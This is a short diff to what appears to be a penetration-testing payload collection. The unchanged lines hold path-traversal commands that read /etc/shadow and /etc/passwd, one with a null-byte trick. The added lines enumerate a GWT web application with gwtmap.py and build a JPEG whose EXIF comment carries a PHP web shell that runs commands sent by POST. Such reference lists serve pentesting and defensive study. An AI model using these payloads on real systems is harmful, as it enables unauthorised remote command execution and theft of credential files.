@@ -356,3 +356,8 @@ cat ..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
 cat ../../../../../../../../../../../../etc/shadow%00
 cat ../../../../../../../../../../../../etc/passwd
 cat /../../../../../../../../../../etc/shadow
+./gwtmap.py -u http://10.10.10.10/olympian/C39AB19B83398A76A21E0CD04EC9B14C.cache.js
+./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --backup -p http://127.0.0.1:8080
+convert -size 110x110 xc:white payload.jpg
+exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
